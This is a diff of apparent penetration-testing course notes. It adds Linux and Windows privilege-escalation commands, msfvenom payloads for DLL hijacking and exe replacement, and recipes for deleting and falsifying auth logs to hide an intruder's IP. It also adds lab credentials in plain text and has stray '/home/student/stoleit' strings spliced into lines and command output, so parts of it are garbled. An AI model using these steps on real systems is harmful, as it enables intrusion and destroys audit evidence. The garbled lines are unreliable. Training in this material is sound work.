@@ -12,7 +12,7 @@ ops station
 
 
 Phase 1: Mission Definition
-    Define mission goals and targets.
+    Define mission goals and targets./home/student/stoleit
     Determine scope of mission.
     What networks are valid targets?
     What machines are valid targets?
@@ -64,7 +64,7 @@ Usage and Examples for NMAP Scripts
 	nmap --script-help <filename>|<category>|<directory>
 	nmap --script-trace
 
-for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
+for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done/
 
 ---------------------------------------------------------------------------------
 
@@ -74,7 +74,7 @@ on jump box ping sweep network given
 	for i in {97..126} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
 		OUTPUT:
 		64 bytes from 192.168.28.97: icmp_seq=1 ttl=64 time=4.55 ms
-		64 bytes from 192.168.28.100: icmp_seq=1 ttl=63 time=2.78 ms
+		64 bytes from 192.168.28.100: icmp_s/home/student/stoleiteq=1 ttl=63 time=2.78 ms
 		64 bytes from 192.168.28.99: icmp_seq=1 ttl=63 time=4.74 ms
 		64 bytes from 192.168.28.105: icmp_seq=1 ttl=63 time=0.999 ms
 		64 bytes from 192.168.28.111: icmp_seq=1 ttl=63 time=0.897 ms
@@ -154,7 +154,7 @@ generate -b "\x00" -f python
 simple buffer overflow
 
 #!/usr/bin/python
-
+/home/student/stoleit
 import socket
 
 buf = " " ## where you input commands after testing it works
@@ -189,9 +189,7 @@ process enumeration
 	windows
 		tasklists /v
 	linux
-		ps -elfssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgP2uXYcb+W40AxfGwjsfFlA6jR1/zL711bXQAjvAuEv5L6tNVkdDyNNdD66Q8Jwsh8DzLPDqeOTmQr7FDMAO5sCD7z+R+kEpvoVzBsgKXL22l2ipxGtCxJzhI1HT16fYB1BZPqmZpJylBdym3KN0yZvgFMs7B0jb9SFkh/+Jp1OxzohX88Xc2j+Dk1URkY0xZOTvOgYafFjbFINaeuVMqb+YeEyj9jxxNFo69F4selrftFmaf5AupSiW+P8GjOReArWBxEgvcLqshl+gTuf817jxb2terzW8f/qVK09XsepMPPZ5elfUqSzK1N3a4sTu1+0EsGALGjB/iSXbeCmcD comrade@extranet.site.donovia
-</pre>
-</body>
+		ps -elf
 
 service enumeration
 	windows
@@ -240,6 +238,89 @@ exact same thing but windows
 		scp -P 1212 file.sh student@127.0.0.1:C:/users/student/desktop 
 	from remote
 		scp -P 1212 student@127.0.0.1:C:/users/student/desktop/script.sh .
+
+comrade :: StudentMidwayPassword
+
+----------------------------------------------------------------------------------------------
+
+LINUX
+PRIVILEDGE ESCALATION
+	use in order to find your permissions
+		sudo -l
+	when youve found what you can use with sudo look it up here 
+		https://gtfobins.github.io
+	exploit utilizing what youve found
+suid/sgid
+	checking for the suid bit. 4000 is marking that were searching for the suid bit
+		find / -type f -perm /4000 -ls 2>/dev/null
+	checking for the sgid bit. 2000 is marking that were searching for the sgid bit
+		find / -type f -perm /2000 -ls 2>/dev/null
+	checking for both. 6000 is them added together
+		find / -type f -perm /6000 -ls 2>/dev/null
+world writable files
+	files and directories writable by the current user
+		find / -type f -writable -o -type d -writable 2>/dev/null
+	files and directories writable by others(everyone else)
+		find / -type f -perm /2 -o -type d -perm /2 2>/dev/null
+
+Auditing SystemV
+	ausearch: Pulls from audit.log
+		ausearch -p 22
+		ausearch -m USER_LOGIN -sv no
+		ausearch -ua edwards -ts yesterday -te now -i
+SystemD
+	Utilzes journalctl
+		journalctl _TRANSPORT=audit
+		journalctl _TRANSPORT=audit | grep 603
+
+Reading FilesStudentPrivPassword
+	Control your output with pipes | and more
+		cat /var/log/auth.log | egrep -v "opened|closed"
+		awk '/opened/' /var/log/auth.log
+		last OR lastb OR lastlog
+		strings OR dd            # for data files
+		more /var/log/syslog
+		head/tail
+
+Cleaning The Logs (Basic)
+	Get rid of it
+		rm -rf /var/log/...
+	Clear It
+		cat /dev/null > /var/log/...
+		echo > /var/log/...
+
+Cleaning The Logs (Precise)
+	Always work off a backup!
+		GREP (Remove)
+			egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
+		SED (Replace)
+			cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log
+
+Rsyslog
+    Newer Rsyslog references /etc/rsyslog.d/* for settings/rules
+    Older version only uses /etc/rsyslog.conf
+    Find out which one being used
+    	grep "IncludeConfig" /etc/rsyslog.conf
+-----------------------------------------------------------------------------------------
+
+WINDOWS
+PRIVILEDGE ESCALATION
+
+procmon
+	process name contains putty.exe
+	result is NAME NOT FOUND
+	path contains .dll
+(Get-Process | ?{$_.name -like "putty"}).kill()
+dll hijacking
+	msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+exe replacement
+	msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\users\student\Desktop\whoami.txt' -f exe > putty.exe
+
+auditpol /get /category:*
+auditpol /get /category:* | findstr /i "success failure"
+
+
+
 
 
 
